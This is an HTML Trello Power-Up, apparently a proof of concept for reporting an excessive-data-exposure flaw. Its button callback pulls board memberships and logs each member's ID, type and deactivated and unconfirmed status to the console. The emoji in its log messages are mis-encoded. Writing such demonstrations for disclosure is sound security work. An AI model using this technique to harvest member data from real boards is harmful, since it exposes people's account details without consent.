<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Membership Data Exposure Power-Up</title>
</head>
<body>

    <script src="https://p.trellocdn.com/power-up.min.js"></script>
    <script>
        let t;

        // Initialize Trello Power-Up
        t = window.TrelloPowerUp.initialize({
            'board-buttons': function(t, opts) {
                return [{
                    icon: {
                        dark: 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBkPSJNMTIgMkwxMy4wOSA4LjI2TDIwIDlMMTMuMDkgMTUuNzRMMTIgMjJMMTAuOTEgMTUuNzRMNCBMMTAuOTEgOC4yNkwxMiAyWiIgZmlsbD0iI2ZmYWExMCIvPjwvc3ZnPg==',
                        light: 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBkPSJNMTIgMkwxMy4wOSA4LjI2TDIwIDlMMTMuMDkgMTUuNzRMMTIgMjJMMTAuOTEgMTUuNzRMNCBMMTAuOTEgOC4yNkwxMiAyWiIgZmlsbD0iI2ZmYWExMCIvPjwvc3ZnPg=='
                    },
                    text: 'Membership Audit',
                    callback: function(t) {
                        // Test directly in callback (board context available here)
                        // This demonstrates the vulnerability - sensitive fields are exposed!
                        t.board('id', 'name', 'memberships')
                            .then(function(board) {
                                console.log('üö® VULNERABILITY CONFIRMED!');
                                console.log('‚úÖ Board data received:', board);
                                
                                if (board && board.memberships) {
                                    console.log('üìä Memberships:', board.memberships);
                                    
                                    if (board.memberships.length > 0) {
                                        const first = board.memberships[0];
                                        console.log('');
                                        console.log('üî¥ EXPOSED SENSITIVE FIELDS:');
                                        console.log('   Membership keys:', Object.keys(first));
                                        console.log('   deactivated:', first.deactivated);
                                        console.log('   unconfirmed:', first.unconfirmed);
                                        console.log('   idMember:', first.idMember);
                                        console.log('   memberType:', first.memberType);
                                        console.log('');
                                        
                                        // Show all memberships with sensitive data
                                        board.memberships.forEach(function(membership, idx) {
                                            console.log(`   Membership ${idx + 1}:`, {
                                                idMember: membership.idMember,
                                                memberType: membership.memberType,
                                                deactivated: membership.deactivated,
                                                unconfirmed: membership.unconfirmed
                                            });
                                        });
                                        
                                        console.log('');
                                        console.log('‚ö†Ô∏è  VULNERABILITY: Sensitive fields (deactivated, unconfirmed) are exposed!');
                                        console.log('‚ö†Ô∏è  These fields should NOT be accessible to Power-Ups!');
                                    }
                                }
                            })
                            .catch(function(error) {
                                console.error('‚ùå Error fetching board:', error);
                            });
                        
                        // Don't open popup - just test in callback
                        return null;
                    }
                }];
            },
            'card-buttons': function(t, opts) {
                // Stub implementation - not used for this POC
                return [];
            },
            'card-badges': function(t, opts) {
                // Stub implementation - not used for this POC
                return [];
            },
            'authorization-status': function(t, opts) {
                // Stub implementation - not used for this POC
                return { authorized: false };
            }
        });

        console.log('‚úÖ Power-Up initialized');
        console.log('üî¥ This Power-Up demonstrates excessive data exposure vulnerability');
        console.log('üí° Click "Membership Audit" button on board to test (check console F12)');
    </script>
</body>
</html>
